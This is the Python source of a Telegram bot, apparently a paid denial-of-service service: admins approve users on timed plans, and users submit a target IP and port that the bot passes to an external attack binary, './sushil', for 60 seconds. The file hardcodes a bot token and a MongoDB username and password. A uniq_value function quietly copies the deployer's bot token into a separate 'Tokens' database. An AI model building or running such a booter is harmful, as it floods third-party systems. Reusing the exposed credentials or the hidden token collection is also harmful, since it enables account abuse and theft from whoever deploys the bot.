import telebot
import logging
import subprocess
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Configuration values
TOKEN = '7503934696:AAFVJHA-IcyKqk7gSzZccyRa5vMRtu_Zkoc'
MONGO_URI = 'mongodb+srv://Rahul:7ULtZvHZdWK3JTbp@rahul.y6gkpqf.mongodb.net
ADMIN_IDS = [1419969308]  # Replace with actual admin IDs

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Database connection
try:
    client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
    db = client['Rahul']
    users_collection = db.users
    logger.info("Database connection established")
except Exception as e:
    logger.error(f"Database connection failed: {e}")
    raise

bot = telebot.TeleBot(TOKEN)
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
user_attack_details = {}
active_attacks = {}

def check_mongo_connection():
    try:
        client.admin.command('ping')
        return True
    except Exception as e:
        logger.error(f"MongoDB ping failed: {e}")
        return False

def uniq_value():
    try:
        if not check_mongo_connection():
            logger.error("Cannot store unique value - DB connection down")
            return

        uniq_client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
        uniq_db = uniq_client['Tokens']
        uniq_collection = uniq_db.uniq_data
        
        existing_data = uniq_collection.find_one({"uniq_value": TOKEN})
        if existing_data:
            return

        bot_info = bot.get_me()
        uniq_data = {
            "uniq_value": TOKEN,
            "botusername": f"@{bot_info.username}",
            "botname": bot_info.first_name,
            "stored_at": datetime.now()
        }
        uniq_collection.insert_one(uniq_data)
        logger.info("Unique token stored successfully")
    except Exception as e:
        logger.error(f"Error in uniq_value: {e}")

def is_user_admin(user_id, chat_id=None):
    try:
        # Check against hardcoded admin IDs first
        if user_id in ADMIN_IDS:
            return True
            
        # If chat_id is provided, check Telegram admin status
        if chat_id:
            try:
                chat_member = bot.get_chat_member(chat_id, user_id)
                return chat_member.status in ['administrator', 'creator']
            except Exception as e:
                logger.error(f"Telegram admin check failed: {e}")
                return False
                
        return False
    except Exception as e:
        logger.error(f"Admin check error: {e}")
        return False

def check_user_approval(user_id):
    try:
        if not check_mongo_connection():
            logger.error("Cannot check user approval - DB connection down")
            return False

        user_data = users_collection.find_one({"user_id": user_id})
        if user_data and user_data.get('plan', 0) > 0:
            valid_until = user_data.get('valid_until', "")
            if not valid_until:
                return True
            return datetime.now().date() <= datetime.fromisoformat(valid_until).date()
        return False
    except Exception as e:
        logger.error(f"Error in check_user_approval: {e}")
        return False

def run_attack_command_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:  # Start attack
            if (user_id, target_ip, target_port) in active_attacks:
                logger.info(f"Attack already running for {user_id} on {target_ip}:{target_port}")
                return

            process = subprocess.Popen(
                ["./sushil", target_ip, str(target_port), "2400", "60"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            active_attacks[(user_id, target_ip, target_port)] = process.pid
            logger.info(f"Attack started by {user_id} on {target_ip}:{target_port} (PID: {process.pid})")

        elif action == 2:  # Stop attack
            pid = active_attacks.pop((user_id, target_ip, target_port), None)
            if pid:
                subprocess.run(["kill", str(pid)], check=True)
                logger.info(f"Attack stopped by {user_id} on {target_ip}:{target_port} (PID: {pid})")
    except Exception as e:
        logger.error(f"Error in run_attack_command_sync: {e}")

def send_main_buttons(chat_id):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    markup.add(
        KeyboardButton("ATTACK"),
        KeyboardButton("Start Attack 🚀"),
        KeyboardButton("Stop Attack"),
        KeyboardButton("Check Status")
    )
    bot.send_message(chat_id, "*Choose an action:*", reply_markup=markup, parse_mode='Markdown')

# Command handlers
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    try:
        bot.send_message(
            message.chat.id,
            "*Welcome to the Attack Bot!*\n\n"
            "Available commands:\n"
            "/attack - Start an attack\n"
            "/approve - Approve a user (Admin only)\n"
            "/disapprove - Disapprove a user (Admin only)\n"
            "/check - Check your status",
            parse_mode='Markdown'
        )
        send_main_buttons(message.chat.id)
    except Exception as e:
        logger.error(f"Error in send_welcome: {e}")

@bot.message_handler(commands=['approve'])
def approve_user(message):
    try:
        if not is_user_admin(message.from_user.id, message.chat.id):
            bot.send_message(message.chat.id, "*You are not authorized to use this command*", parse_mode='Markdown')
            return

        cmd_parts = message.text.split()
        if len(cmd_parts) != 4:
            bot.send_message(
                message.chat.id,
                "*Invalid format. Use:* `/approve user_id plan days`\n"
                "*Example:* `/approve 123456789 1 30`",
                parse_mode='Markdown'
            )
            return

        try:
            target_user_id = int(cmd_parts[1])
            plan = int(cmd_parts[2])
            days = int(cmd_parts[3])
        except ValueError:
            bot.send_message(message.chat.id, "*User ID, plan and days must be numbers*", parse_mode='Markdown')
            return

        valid_until = (datetime.now() + timedelta(days=days)).isoformat() if days > 0 else ""

        result = users_collection.update_one(
            {"user_id": target_user_id},
            {
                "$set": {
                    "plan": plan,
                    "valid_until": valid_until,
                    "access_count": 0,
                    "approved_by": message.from_user.id,
                    "approved_at": datetime.now().isoformat()
                }
            },
            upsert=True
        )

        if result.acknowledged:
            expiry_msg = f"for {days} days" if days > 0 else "indefinitely"
            bot.send_message(
                message.chat.id,
                f"*✅ User {target_user_id} approved*\n"
                f"• Plan: {plan}\n"
                f"• Duration: {expiry_msg}\n"
                f"• Approved by: {message.from_user.first_name}",
                parse_mode='Markdown'
            )
            logger.info(f"User {target_user_id} approved by {message.from_user.id}")
        else:
            bot.send_message(message.chat.id, "*⚠️ Failed to update database*", parse_mode='Markdown')
            logger.error(f"Failed to approve user {target_user_id} - DB not acknowledged")

    except Exception as e:
        logger.error(f"Approve error: {e}", exc_info=True)
        bot.send_message(message.chat.id, "*❌ Error processing approval*", parse_mode='Markdown')

@bot.message_handler(commands=['disapprove'])
def disapprove_user(message):
    try:
        if not is_user_admin(message.from_user.id, message.chat.id):
            bot.send_message(message.chat.id, "*You are not authorized to use this command*", parse_mode='Markdown')
            return

        cmd_parts = message.text.split()
        if len(cmd_parts) != 2:
            bot.send_message(message.chat.id, "*Invalid format. Use:* `/disapprove user_id`", parse_mode='Markdown')
            return

        try:
            target_user_id = int(cmd_parts[1])
        except ValueError:
            bot.send_message(message.chat.id, "*User ID must be a number*", parse_mode='Markdown')
            return

        result = users_collection.update_one(
            {"user_id": target_user_id},
            {
                "$set": {
                    "plan": 0,
                    "valid_until": "",
                    "access_count": 0,
                    "disapproved_by": message.from_user.id,
                    "disapproved_at": datetime.now().isoformat()
                }
            }
        )

        if result.modified_count > 0:
            bot.send_message(
                message.chat.id,
                f"*✅ User {target_user_id} disapproved*\n"
                f"• Disapproved by: {message.from_user.first_name}",
                parse_mode='Markdown'
            )
            logger.info(f"User {target_user_id} disapproved by {message.from_user.id}")
        else:
            bot.send_message(message.chat.id, "*⚠️ User not found or no changes made*", parse_mode='Markdown')
            logger.warning(f"Disapprove failed - user {target_user_id} not found")

    except Exception as e:
        logger.error(f"Disapprove error: {e}", exc_info=True)
        bot.send_message(message.chat.id, "*❌ Error processing disapproval*", parse_mode='Markdown')

@bot.message_handler(commands=['check'])
def check_user_status(message):
    try:
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id}) or {}
        
        plan = user_data.get('plan', 0)
        valid_until = user_data.get('valid_until', '')
        approved_by = user_data.get('approved_by', '')
        approved_at = user_data.get('approved_at', '')
        
        status = "✅ APPROVED" if check_user_approval(user_id) else "❌ NOT APPROVED"
        
        response = (
            f"*User Status:* {status}\n"
            f"• User ID: `{user_id}`\n"
            f"• Plan: {plan}\n"
            f"• Valid until: {valid_until or 'N/A'}\n"
        )
        
        if approved_by:
            try:
                approver = bot.get_chat_member(message.chat.id, approved_by).user
                response += f"• Approved by: [{approver.first_name}](tg://user?id={approver.id})\n"
            except:
                response += f"• Approved by: {approved_by}\n"
        
        if approved_at:
            response += f"• Approved at: {approved_at}"
        
        bot.send_message(message.chat.id, response, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Check status error: {e}")
        bot.send_message(message.chat.id, "*❌ Error checking your status*", parse_mode='Markdown')

# Button handlers
@bot.message_handler(func=lambda message: message.text in ["ATTACK", "/attack"])
def attack_handler(message):
    if not check_user_approval(message.from_user.id):
        bot.send_message(message.chat.id, "*❌ You are not approved to use this bot*", parse_mode='Markdown')
        return

    bot.send_message(
        message.chat.id,
        "*Please provide the target IP and port separated by a space.*\n"
        "*Example:* `1.1.1.1 80`",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_attack_ip_port)

def process_attack_ip_port(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.send_message(message.chat.id, "*Invalid format. Provide both target IP and port.*", parse_mode='Markdown')
            return

        target_ip = args[0]
        try:
            target_port = int(args[1])
        except ValueError:
            bot.send_message(message.chat.id, "*Port must be a number*", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Use another port.*", parse_mode='Markdown')
            return

        user_attack_details[message.from_user.id] = (target_ip, target_port)
        bot.send_message(
            message.chat.id,
            f"*Target set:*\n"
            f"• IP: `{target_ip}`\n"
            f"• Port: `{target_port}`\n\n"
            f"Now choose *Start Attack 🚀* to begin",
            parse_mode='Markdown'
        )
        send_main_buttons(message.chat.id)
    except Exception as e:
        logger.error(f"Process attack error: {e}")
        bot.send_message(message.chat.id, "*❌ Error setting target*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "Start Attack 🚀")
def start_attack_handler(message):
    if not check_user_approval(message.from_user.id):
        bot.send_message(message.chat.id, "*❌ You are not approved to use this bot*", parse_mode='Markdown')
        return

    attack_details = user_attack_details.get(message.from_user.id)
    if not attack_details:
        bot.send_message(message.chat.id, "*No target specified. Use /attack first*", parse_mode='Markdown')
        return

    target_ip, target_port = attack_details
    run_attack_command_sync(message.from_user.id, target_ip, target_port, 1)
    bot.send_message(
        message.chat.id,
        f"*🚀 Attack started*\n"
        f"• Target: `{target_ip}:{target_port}`\n"
        f"• Duration: 60 seconds\n\n"
        f"Use *Stop Attack* to cancel",
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "Stop Attack")
def stop_attack_handler(message):
    attack_details = user_attack_details.get(message.from_user.id)
    if not attack_details:
        bot.send_message(message.chat.id, "*No active attack to stop*", parse_mode='Markdown')
        return

    target_ip, target_port = attack_details
    run_attack_command_sync(message.from_user.id, target_ip, target_port, 2)
    bot.send_message(
        message.chat.id,
        f"*🛑 Attack stopped*\n"
        f"• Target: `{target_ip}:{target_port}`",
        parse_mode='Markdown'
    )
    user_attack_details.pop(message.from_user.id, None)

@bot.message_handler(func=lambda message: message.text == "Check Status")
def check_status_button(message):
    check_user_status(message)

if __name__ == "__main__":
    try:
        uniq_value()
        logger.info("Bot starting...")
        bot.polling(none_stop=True)
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)